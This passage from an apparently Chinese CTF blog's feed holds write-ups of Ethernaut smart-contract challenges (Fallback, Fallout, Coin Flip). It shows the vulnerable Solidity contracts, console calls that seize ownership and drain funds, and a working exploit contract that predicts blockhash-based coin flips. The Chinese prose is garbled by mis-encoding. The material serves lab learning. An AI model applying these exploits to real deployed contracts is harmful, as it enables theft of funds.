punctuation">.</span>zfill<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> temp<span class="token punctuation">]</span>temp <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>temp<span class="token punctuation">)</span>mac <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>temp<span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span>random<span class="token punctuation">.</span>seed<span class="token punctuation">(</span>mac<span class="token punctuation">)</span>randStr <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span>random<span class="token punctuation">.</span>random<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>randStr<span class="token punctuation">)</span><span class="token comment">#69.83331307187989</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å‰©ä¸‹å°±æ˜¯ä¼ªé€ æ‹¿flag</p><script type="text&#x2F;javascript" src="https://unpkg.com/kity@2.0.4/dist/kity.min.js"></script><script type="text&#x2F;javascript" src="https://unpkg.com/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text&#x2F;javascript" src="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text&#x2F;css" href="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.css">]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Ethernautè®°å½•</title>
      <link href="/posts/b1d79a49.html"/>
      <url>/posts/b1d79a49.html</url>
      
        <content type="html"><![CDATA[<h2 id="Fallback"><a href="#Fallback" class="headerlink" title="Fallback"></a>Fallback</h2><p>é¦–å…ˆçœ‹é€šå…³æ–¹å¼</p><blockquote><p>ä»”ç»†çœ‹ä¸‹é¢çš„åˆçº¦ä»£ç .</p><p>é€šè¿‡è¿™å…³ä½ éœ€è¦</p><ol><li>è·å¾—è¿™ä¸ªåˆçº¦çš„æ‰€æœ‰æƒ</li><li>æŠŠä»–çš„ä½™é¢å‡åˆ°0</li></ol><p> è¿™å¯èƒ½æœ‰å¸®åŠ©</p><ul><li>å¦‚ä½•é€šè¿‡ä¸ABIäº’åŠ¨å‘é€ether</li><li>å¦‚ä½•åœ¨ABIä¹‹å¤–å‘é€ether</li><li>è½¬æ¢ wei/ether å•ä½ (å‚è§ <code>help()</code> å‘½ä»¤)</li><li>Fallback æ–¹æ³•</li></ul></blockquote><p>å†çœ‹ä»£ç </p><pre class="line-numbers language-solidity" data-language="solidity"><code class="language-solidity"><span class="token comment">// SPDX-License-Identifier: MIT</span><span class="token keyword">pragma</span> <span class="token keyword">solidity</span> <span class="token operator">^</span><span class="token version number">0.6.0</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token string">'@openzeppelin/contracts/math/SafeMath.sol'</span><span class="token punctuation">;</span><span class="token keyword">contract</span> <span class="token class-name">Fallback</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">using</span> <span class="token class-name">SafeMath</span> <span class="token keyword">for</span> <span class="token builtin">uint256</span><span class="token punctuation">;</span>  <span class="token keyword">mapping</span><span class="token punctuation">(</span><span class="token builtin">address</span> <span class="token operator">=></span> <span class="token builtin">uint</span><span class="token punctuation">)</span> <span class="token keyword">public</span> contributions<span class="token punctuation">;</span>  <span class="token builtin">address</span> <span class="token keyword">payable</span> <span class="token keyword">public</span> owner<span class="token punctuation">;</span>  <span class="token keyword">constructor</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token punctuation">&#123;</span>    owner <span class="token operator">=</span> msg<span class="token punctuation">.</span>sender<span class="token punctuation">;</span>    contributions<span class="token punctuation">[</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1000</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token number">1</span> ether<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">modifier</span> onlyOwner <span class="token punctuation">&#123;</span>        <span class="token keyword">require</span><span class="token punctuation">(</span>            msg<span class="token punctuation">.</span>sender <span class="token operator">==</span> owner<span class="token punctuation">,</span>            <span class="token string">"caller is not the owner"</span>        <span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">_</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>  <span class="token keyword">function</span> <span class="token function">contribute</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token keyword">payable</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">require</span><span class="token punctuation">(</span>msg<span class="token punctuation">.</span>value <span class="token operator">&lt;</span> <span class="token number">0.001</span> ether<span class="token punctuation">)</span><span class="token punctuation">;</span>    contributions<span class="token punctuation">[</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">]</span> <span class="token operator">+=</span> msg<span class="token punctuation">.</span>value<span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>contributions<span class="token punctuation">[</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">]</span> <span class="token operator">></span> contributions<span class="token punctuation">[</span>owner<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      owner <span class="token operator">=</span> msg<span class="token punctuation">.</span>sender<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">function</span> <span class="token function">getContribution</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token keyword">view</span> <span class="token keyword">returns</span> <span class="token punctuation">(</span><span class="token builtin">uint</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> contributions<span class="token punctuation">[</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">]</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">function</span> <span class="token function">withdraw</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">public</span> onlyOwner <span class="token punctuation">&#123;</span>    owner<span class="token punctuation">.</span><span class="token function">transfer</span><span class="token punctuation">(</span><span class="token builtin">address</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">.</span>balance<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token function">receive</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">external</span> <span class="token keyword">payable</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">require</span><span class="token punctuation">(</span>msg<span class="token punctuation">.</span>value <span class="token operator">></span> <span class="token number">0</span> <span class="token operator">&amp;&amp;</span> contributions<span class="token punctuation">[</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">]</span> <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    owner <span class="token operator">=</span> msg<span class="token punctuation">.</span>sender<span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>é€æ­¥åˆ†æï¼Œåœ¨åˆçº¦çš„æ„é€ å‡½æ•°ä¸­å°†åˆçº¦çš„éƒ¨ç½²è€…è®¾ç½®æˆäº†å‡½æ•°çš„ownerå¹¶ä¸”è®¾å®šäº†å…¶è´¡çŒ®å€¼ä¸º1000ethï¼Œå¦‚æœèµ°contributeå‡½æ•°æ¥è·å–owneræƒé™çš„è¯éœ€è¦è¶…è¿‡1000ethçš„è´¡çŒ®ï¼Œè€Œæ¯æ¬¡çš„è´¡çŒ®åˆéœ€è¦å°äº0.001ethï¼Œè¿™æ˜¾ç„¶æ˜¯ä¸ç°å®çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬çœ‹å‘receiveå‡½æ•°ï¼Œåœ¨è¿™é‡Œåªè¦æˆ‘ä»¬å‘receiveå‡½æ•°æºå¸¦ethï¼Œå¹¶ä¸”æˆ‘ä»¬æœ‰è´¡çŒ®å€¼å°±èƒ½æ‹¿åˆ°owneræƒé™ï¼Œæœ€åå†ä½¿ç”¨withdrawå°†åˆçº¦å‰©ä½™ä»£å¸è½¬å‡ºå³å¯</p><ul><li>contract.contribute({value:1})</li><li>contract.sendTransaction({value:1})</li><li>contract.withdraw()</li></ul><h2 id="FallOut"><a href="#FallOut" class="headerlink" title="FallOut"></a>FallOut</h2><pre class="line-numbers language-solidity" data-language="solidity"><code class="language-solidity"><span class="token comment">// SPDX-License-Identifier: MIT</span><span class="token keyword">pragma</span> <span class="token keyword">solidity</span> <span class="token operator">^</span><span class="token version number">0.6.0</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token string">'@openzeppelin/contracts/math/SafeMath.sol'</span><span class="token punctuation">;</span><span class="token keyword">contract</span> <span class="token class-name">Fallout</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">using</span> <span class="token class-name">SafeMath</span> <span class="token keyword">for</span> <span class="token builtin">uint256</span><span class="token punctuation">;</span>  <span class="token keyword">mapping</span> <span class="token punctuation">(</span><span class="token builtin">address</span> <span class="token operator">=></span> <span class="token builtin">uint</span><span class="token punctuation">)</span> allocations<span class="token punctuation">;</span>  <span class="token builtin">address</span> <span class="token keyword">payable</span> <span class="token keyword">public</span> owner<span class="token punctuation">;</span>  <span class="token comment">/* constructor */</span>  <span class="token keyword">function</span> <span class="token function">Fal1out</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token keyword">payable</span> <span class="token punctuation">&#123;</span>    owner <span class="token operator">=</span> msg<span class="token punctuation">.</span>sender<span class="token punctuation">;</span>    allocations<span class="token punctuation">[</span>owner<span class="token punctuation">]</span> <span class="token operator">=</span> msg<span class="token punctuation">.</span>value<span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">modifier</span> onlyOwner <span class="token punctuation">&#123;</span>        <span class="token keyword">require</span><span class="token punctuation">(</span>            msg<span class="token punctuation">.</span>sender <span class="token operator">==</span> owner<span class="token punctuation">,</span>            <span class="token string">"caller is not the owner"</span>        <span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">_</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>  <span class="token keyword">function</span> <span class="token function">allocate</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token keyword">payable</span> <span class="token punctuation">&#123;</span>    allocations<span class="token punctuation">[</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">]</span> <span class="token operator">=</span> allocations<span class="token punctuation">[</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>msg<span class="token punctuation">.</span>value<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">function</span> <span class="token function">sendAllocation</span><span class="token punctuation">(</span><span class="token builtin">address</span> <span class="token keyword">payable</span> allocator<span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">require</span><span class="token punctuation">(</span>allocations<span class="token punctuation">[</span>allocator<span class="token punctuation">]</span> <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    allocator<span class="token punctuation">.</span><span class="token function">transfer</span><span class="token punctuation">(</span>allocations<span class="token punctuation">[</span>allocator<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">function</span> <span class="token function">collectAllocations</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">public</span> onlyOwner <span class="token punctuation">&#123;</span>    msg<span class="token punctuation">.</span>sender<span class="token punctuation">.</span><span class="token function">transfer</span><span class="token punctuation">(</span><span class="token builtin">address</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">.</span>balance<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">function</span> <span class="token function">allocatorBalance</span><span class="token punctuation">(</span><span class="token builtin">address</span> allocator<span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token keyword">view</span> <span class="token keyword">returns</span> <span class="token punctuation">(</span><span class="token builtin">uint</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> allocations<span class="token punctuation">[</span>allocator<span class="token punctuation">]</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>è¿™å¾ˆç™½ç—´æ˜¯å§? çœŸå®ä¸–ç•Œçš„åˆçº¦å¿…é¡»å®‰å…¨çš„å¤š, éš¾ä»¥å…¥ä¾µçš„å¤š, å¯¹å§?</p><p>å®é™…ä¸Šâ€¦ ä¹Ÿæœªå¿….</p><p>Rubixiçš„æ•…äº‹åœ¨ä»¥å¤ªåŠç”Ÿæ€ä¸­éå¸¸çŸ¥å. è¿™ä¸ªå…¬å¸æŠŠåå­—ä» â€˜Dynamic Pyramidâ€™ æ”¹æˆ â€˜Rubixiâ€™ ä½†æ˜¯ä¸çŸ¥é“æ€ä¹ˆåœ°, ä»–ä»¬æ²¡æœ‰æŠŠåˆçº¦çš„ constructor æ–¹æ³•ä¹Ÿä¸€èµ·æ›´å:</p><pre class="line-numbers language-none"><code class="language-none">contract Rubixi &#123;  address private owner;  function DynamicPyramid() &#123; owner &#x3D; msg.sender; &#125;  function collectAllFees() &#123; owner.transfer(this.balance) &#125;  ...<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>è¿™è®©æ”»å‡»è€…å¯ä»¥è°ƒç”¨æ—§åˆçº¦çš„constructor ç„¶åè·å¾—åˆçº¦çš„æ§åˆ¶æƒ, ç„¶åå†è·å¾—ä¸€äº›èµ„äº§. æ˜¯çš„. è¿™äº›é‡å¤§é”™è¯¯åœ¨æ™ºèƒ½åˆçº¦çš„ä¸–ç•Œæ˜¯æœ‰å¯èƒ½çš„.</p></blockquote><p>å°±è¿™æ²¡é”™</p><h2 id="Coin-Flip"><a href="#Coin-Flip" class="headerlink" title="Coin Flip"></a>Coin Flip</h2><blockquote><p>è¿™æ˜¯ä¸€ä¸ªæ·ç¡¬å¸çš„æ¸¸æˆï¼Œä½ éœ€è¦è¿ç»­çš„çŒœå¯¹ç»“æœã€‚å®Œæˆè¿™ä¸€å…³ï¼Œä½ éœ€è¦é€šè¿‡ä½ çš„è¶…èƒ½åŠ›æ¥è¿ç»­çŒœå¯¹åæ¬¡ã€‚</p><p>è¿™å¯èƒ½èƒ½å¸®åŠ©åˆ°ä½ </p><ul><li>æŸ¥çœ‹ä¸Šé¢çš„å¸®åŠ©é¡µé¢ï¼Œâ€œæ§åˆ¶å°ä¹‹å¤–â€ éƒ¨åˆ†</li></ul></blockquote><pre class="line-numbers language-solidity" data-language="solidity"><code class="language-solidity"><span class="token comment">// SPDX-License-Identifier: MIT</span><span class="token keyword">pragma</span> <span class="token keyword">solidity</span> <span class="token operator">^</span><span class="token version number">0.6.0</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token string">'@openzeppelin/contracts/math/SafeMath.sol'</span><span class="token punctuation">;</span><span class="token keyword">contract</span> <span class="token class-name">CoinFlip</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">using</span> <span class="token class-name">SafeMath</span> <span class="token keyword">for</span> <span class="token builtin">uint256</span><span class="token punctuation">;</span>  <span class="token builtin">uint256</span> <span class="token keyword">public</span> consecutiveWins<span class="token punctuation">;</span>  <span class="token builtin">uint256</span> lastHash<span class="token punctuation">;</span>  <span class="token builtin">uint256</span> FACTOR <span class="token operator">=</span> <span class="token number">57896044618658097711785492504343953926634992332820282019728792003956564819968</span><span class="token punctuation">;</span>  <span class="token keyword">constructor</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token punctuation">&#123;</span>    consecutiveWins <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">function</span> <span class="token function">flip</span><span class="token punctuation">(</span><span class="token builtin">bool</span> _guess<span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token keyword">returns</span> <span class="token punctuation">(</span><span class="token builtin">bool</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token builtin">uint256</span> blockValue <span class="token operator">=</span> <span class="token builtin">uint256</span><span class="token punctuation">(</span><span class="token function">blockhash</span><span class="token punctuation">(</span>block<span class="token punctuation">.</span>number<span class="token punctuation">.</span><span class="token function">sub</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>lastHash <span class="token operator">==</span> blockValue<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token keyword">revert</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//å›æ»š</span>    <span class="token punctuation">&#125;</span>    lastHash <span class="token operator">=</span> blockValue<span class="token punctuation">;</span>    <span class="token builtin">uint256</span> coinFlip <span class="token operator">=</span> blockValue<span class="token punctuation">.</span><span class="token function">div</span><span class="token punctuation">(</span>FACTOR<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token builtin">bool</span> side <span class="token operator">=</span> coinFlip <span class="token operator">==</span> <span class="token number">1</span> <span class="token operator">?</span> <span class="token boolean">true</span> <span class="token punctuation">:</span> <span class="token boolean">false</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>side <span class="token operator">==</span> _guess<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      consecutiveWins<span class="token operator">++</span><span class="token punctuation">;</span>      <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>      consecutiveWins <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>      <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>çœ‹ä»£ç å®šä¹‰çš„ä¸‰ä¸ªæ•°å­—consecutiveWinsï¼ŒlastHashï¼ŒFACTORï¼Œåˆ†åˆ«æ˜¯æˆ‘ä»¬è·èƒœçš„æ¬¡æ•°ï¼Œæœ€åä¸€æ¬¡åŒºå—çš„å“ˆå¸Œï¼Œè¿˜æœ‰2çš„255æ¬¡æ–¹</p><p>å†çœ‹åé¢æ•´ä¸ªå¯¹ç¡¬å¸åè½¬åšåˆ¤æ–­çš„å‡½æ•°å†…å®¹ï¼Œé¦–å…ˆæ˜¯è®©blockValueå€¼ä¸ºå‰ä¸€ä¸ªåŒºå—ï¼Œå¹¶ä¸”è¿›è¡Œåˆ¤æ–­å¦‚æœæ­¤æ¬¡çŒœæµ‹å’Œä¸Šæ¬¡çŒœæµ‹çš„åŒºå—ç›¸åŒå°±å›æ»šæ•´ä¸ªè¿‡ç¨‹ï¼Œå¦‚æœä¸æ˜¯å°±ç»§ç»­ä¸‹é¢å†…å®¹</p><p>é¦–å…ˆå°†æ­¤æ¬¡çš„åŒºå—å†…å®¹å­˜å‚¨ï¼Œå¹¶ä¸”è®©coinFilpçš„å€¼ä¸ºblockValue/FACTORï¼Œæ­¤å¤„ç”±äºè‡ªåŠ¨å–æ•´ï¼Œå¹¶ä¸”FACTORå€¼ä¸º2^255ï¼Œæ‰€ä»¥ç»“æœé1å³0ï¼Œå¯ä»¥çœ‹åˆ°æ•´ä¸ªè¿‡ç¨‹éšæœºç»“æœçš„äº§ç”Ÿå®Œå…¨ä¾é äºä¸Šä¸€ä¸ªåŒºå—ï¼Œæ‰€ä»¥æˆ‘ä»¬åªéœ€è¦å…ˆæœ¬åœ°æ‰§è¡Œä¸€éç®—æ³•è®¡ç®—å‡ºcoinFlipçš„å€¼å°±èƒ½ä¿è¯æˆ‘ä»¬æ¯æ¬¡éƒ½â€œçŒœâ€åˆ°ç»“æœï¼ŒåŒºå—å¤§çº¦ä¸º10ç§’ä¸€ä¸ªï¼Œæ‰€ä»¥ç›´æ¥ä½¿ç”¨æ‰‹æ’¸å¤åˆ¶çŒœæµ‹æ˜¯ä¸ç°å®ï¼Œæˆ‘ä»¬å¯ä»¥å†å†™ä¸€ä¸ªåˆçº¦éƒ¨ç½²åˆ°ç›¸åŒçš„åŒºå—é“¾ä¸Šæ¥æ”»å‡»è¯¥é“¾</p><pre class="line-numbers language-solidity" data-language="solidity"><code class="language-solidity"><span class="token keyword">pragma</span> <span class="token keyword">solidity</span> <span class="token operator">^</span><span class="token version number">0.4.18</span><span class="token punctuation">;</span><span class="token keyword">contract</span> <span class="token class-name">CoinFlip</span> <span class="token punctuation">&#123;</span>  <span class="token builtin">uint256</span> <span class="token keyword">public</span> consecutiveWins<span class="token punctuation">;</span>  <span class="token builtin">uint256</span> lastHash<span class="token punctuation">;</span>  <span class="token builtin">uint256</span> FACTOR <span class="token operator">=</span> <span class="token number">57896044618658097711785492504343953926634992332820282019728792003956564819968</span><span class="token punctuation">;</span>  <span class="token keyword">function</span> <span class="token function">CoinFlip</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token punctuation">&#123;</span>    consecutiveWins <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">function</span> <span class="token function">flip</span><span class="token punctuation">(</span><span class="token builtin">bool</span> _guess<span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token keyword">returns</span> <span class="token punctuation">(</span><span class="token builtin">bool</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token builtin">uint256</span> blockValue <span class="token operator">=</span> <span class="token builtin">uint256</span><span class="token punctuation">(</span>block<span class="token punctuation">.</span><span class="token function">blockhash</span><span class="token punctuation">(</span>block<span class="token punctuation">.</span>number<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>lastHash <span class="token operator">==</span> blockValue<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token keyword">revert</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    lastHash <span class="token operator">=</span> blockValue<span class="token punctuation">;</span>    <span class="token builtin">uint256</span> coinFlip <span class="token operator">=</span> blockValue<span class="token operator">/</span>FACTOR<span class="token punctuation">;</span>    <span class="token builtin">bool</span> side <span class="token operator">=</span> coinFlip <span class="token operator">==</span> <span class="token number">1</span> <span class="token operator">?</span> <span class="token boolean">true</span> <span class="token punctuation">:</span> <span class="token boolean">false</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>side <span class="token operator">==</span> _guess<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      consecutiveWins<span class="token operator">++</span><span class="token punctuation">;</span>      <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>      consecutiveWins <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>      <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">contract</span> <span class="token class-name">exploit</span> <span class="token punctuation">&#123;</span>  CoinFlip expFlip<span class="token punctuation">;</span>  <span class="token builtin">uint256</span> FACTOR <span class="token operator">=</span> <span class="token number">57896044618658097711785492504343953926634992332820282019728792003956564819968</span><span class="token punctuation">;</span>  <span class="token keyword">function</span> <span class="token function">exploit</span><span class="token punctuation">(</span><span class="token builtin">address</span> aimAddr<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    expFlip <span class="token operator">=</span> <span class="token function">CoinFlip</span><span class="token punctuation">(</span>aimAddr<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">function</span> <span class="token function">hack</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token punctuation">&#123;</span>    <span class="token builtin">uint256</span> blockValue <span class="token operator">=</span> <span class="token builtin">uint256</span><span class="token punctuation">(</span>block<span class="token punctuation">.</span><span class="token function">blockhash</span><span class="token punctuation">(</span>block<span class="token punctuation">.</span>number<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token builtin">uint256</span> coinFlip <span class="token operator">=</span> <span class="token builtin">uint256</span><span class="token punctuation">(</span><span class="token builtin">uint256</span><span class="token punctuation">(</span>blockValue<span class="token punctuation">)</span> <span class="token operator">/</span> FACTOR<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token builtin">bool</span> guess <span class="token operator">=</span> coinFlip <span class="token operator">==</span> <span class="token number">1</span> <span class="token operator">?</span> <span class="token boolean">true</span> <span class="token punctuation">:</span> <span class="token boolean">false</span><span class="token punctuation">;</span>    expFlip<span class="token punctuation">.</span><span class="token function">flip</span><span class="token punctuation">(</span>guess<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>åœ¨Remix IDEä¸­é€šè¿‡Metamaskéƒ¨ç½²åˆ°é¢˜ç›®çš„åŒºå—é“¾ä¸Šï¼Œè¿›è¡Œ10æ¬¡hackæ”»å‡»å³å¯</p><blockquote><p>é€šè¿‡solidityäº§ç”Ÿéšæœºæ•°æ²¡æœ‰é‚£ä¹ˆå®¹æ˜“. ç›®å‰æ²¡æœ‰ä¸€ä¸ªå¾ˆè‡ªç„¶çš„æ–¹æ³•æ¥åšåˆ°è¿™ä¸€ç‚¹, è€Œä¸”ä½ åœ¨æ™ºèƒ½åˆçº¦ä¸­åšçš„æ‰€æœ‰äº‹æƒ…éƒ½æ˜¯å…¬å¼€å¯è§çš„, åŒ…æ‹¬æœ¬åœ°å˜é‡å’Œè¢«æ ‡è®°ä¸ºç§æœ‰çš„çŠ¶æ€å˜é‡. çŸ¿å·¥å¯ä»¥æ§åˆ¶ blockhashes, æ—¶é—´æˆ³, æˆ–æ˜¯æ˜¯å¦åŒ…æ‹¬æŸä¸ªäº¤æ˜“, è¿™å¯ä»¥è®©ä»–ä»¬æ ¹æ®ä»–ä»¬ç›®çš„æ¥å·¦å³è¿™äº›äº‹æƒ….</p><p>æƒ³è¦è·å¾—å¯†ç å­¦ä¸Šçš„éšæœºæ•°,ä½ å¯ä»¥ä½¿ç”¨ <a href="https://docs.chain.link/docs/get-a-random-number">Chainlink VRF</a>, å®ƒä½¿ç”¨é¢„è¨€æœº, LINK token, å’Œä¸€ä¸ªé“¾ä¸Šåˆçº¦æ¥æ£€éªŒè¿™æ˜¯ä¸æ˜¯çœŸçš„æ˜¯ä¸€ä¸ªéšæœºæ•°.</p><p>ä¸€äº›å…¶å®ƒçš„é€‰é¡¹åŒ…æ‹¬ä½¿ç”¨æ¯”ç‰¹å¸block headers (é€šè¿‡éªŒè¯ <a href="http://btcrelay.org/">BTC Relay</a>), <a href="https://github.com/randao/randao">RANDAO</a>, æˆ–æ˜¯ <a href="http://www.oraclize.it/">Oraclize</a>).</p></blockquote><h2 id="Telephone"><a href="#Telephone" class="headerlink" title="Telephone"></a>Telephone</h2><pre class="line-numbers language-solidity" data-language="solidity"><code class="language-solidity"><span class="token comment">// SPDX-License-Identifier: MIT</span><span class="token keyword">pragma</span> <span class="token keyword">solidity</span> <span class="token operator">^</span><span class="token version number">0.6.0</span><span class="token punctuation">;</span><span class="token keyword">contract</span> <span class="token class-name">Telephone</span> <span class="token punctuation">&#123;</span>  